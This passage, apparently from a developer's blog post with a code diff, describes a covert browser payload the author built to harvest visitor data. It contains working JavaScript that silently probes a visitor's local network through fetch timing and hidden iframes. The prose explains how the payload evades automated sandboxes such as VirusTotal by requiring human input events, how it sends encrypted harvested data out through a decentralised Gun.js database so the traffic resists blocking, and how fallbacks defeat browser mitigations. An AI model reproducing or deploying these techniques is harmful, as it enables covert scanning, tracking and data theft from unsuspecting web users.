@@ -894,6 +894,65 @@ this.localInterfaces.forEach(ip => {
 });
 
 const targetList = Array.from(gateways);</pre>
+<pre>// Phase 2: Probe targets using Fetch timing
+const pingViaFetch = async (ip) => {
+    const controller = new AbortController();
+    // Set a strict 1200ms timeout. Anything slower is considered an empty IP.
+    const timeoutId = setTimeout(() => controller.abort(), 1200); 
+
+    try {
+        const start = performance.now();
+        await fetch(\`http://\${ip}\`, {
+            mode: 'no-cors',
+            cache: 'no-cache',
+            signal: controller.signal
+        });
+        const duration = performance.now() - start;
+        clearTimeout(timeoutId);
+        
+        fetchActiveHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Fetch Responded)" });
+    } catch (err) {
+        clearTimeout(timeoutId);
+        
+        // If the error isn't our manual abort timeout, the device actively refused the connection quickly
+        if (err.name !== 'AbortError') {
+            fetchActiveHosts.push({ ip: ip, status: "ALIVE (Fetch Refused)" });
+        }
+    }
+};</pre>
+<pre>// Phase 3: Probe targets using Iframe Navigation Timing
+const probeIp = async (ip) => {
+    return new Promise((resolve) => {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none'; // Keep it hidden from the user
+        
+        const start = performance.now();
+        
+        // Failsafe timeout to clean up the DOM
+        const timeoutId = setTimeout(() => {
+            if (document.body.contains(iframe)) document.body.removeChild(iframe);
+            resolve(); 
+        }, 1500);
+
+        // Listen for both onload and onerror to catch any response
+        iframe.onload = iframe.onerror = () => {
+            const duration = performance.now() - start;
+            clearTimeout(timeoutId);
+            
+            if (document.body.contains(iframe)) document.body.removeChild(iframe);
+
+            // If the browser threw an error faster than 1400ms, a device actively closed the connection
+            if (duration < 1400) {
+                activeHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Timing Bypass)" });
+            }
+            resolve();
+        };
+
+        document.body.appendChild(iframe);
+        // Point to the target IP on a port unlikely to be open
+        iframe.src = \`http://\${ip}:31337\`; 
+    });
+};</pre>
 
    <p>then i added the other features like NAT topology identification feature, the a pretty powerful anti-analysis features like an <code>armOnMultiInteraction</code> method which ensured the payload doesn't fire in an automated sandbox (like VirusTotal or Joe Sandbox) as it required a stateful response human response of <code>mousemove</code>-><code>scroll</code>-><code>click</code>. then it verifies the <code>isTrusted</code> property on the click event to ensure it wasn't a programmatically generated click by a clanker. then it was the logic for the exfiltration of the data harvested to the fetcher or the dashboard which would be a site, and the thing i did made it extremely difficult to block the data transmission, as i used <code>Gun.js</code> database for the job, and because of this the whole thing would be decentralized, and instead of sending data to a central C2 server that can be easily blacklisted by DNS, it used a decentralized graph database. and before exfiltration, it uses the Web Crypto API to perform a hybrid encryption (RSA-OAEP for the key wrap and AES-GCM for the payload chunks). this ensured that even if the network traffic is captured, the data remained unreadable without the private key.</p>
              <p>but then i found that these techniques or at least the ones which leaked important stuff, could be mitigated in the modern web, so i made it a bit more robust, in which i added more newer and more subtle fallback features for several features which made the whole thing even more robust and difficult to mitigate, like i added the <code>WebGPU</code> fingerprinting as a fallback for WebGL, made the VPN detection a multi feature process where different ways where used to get the data for the VPN detection,as a step by step process and added a new <code>MTU</code> analysis feature with <code>WebTransport</code> which more difficult to catch.</p>
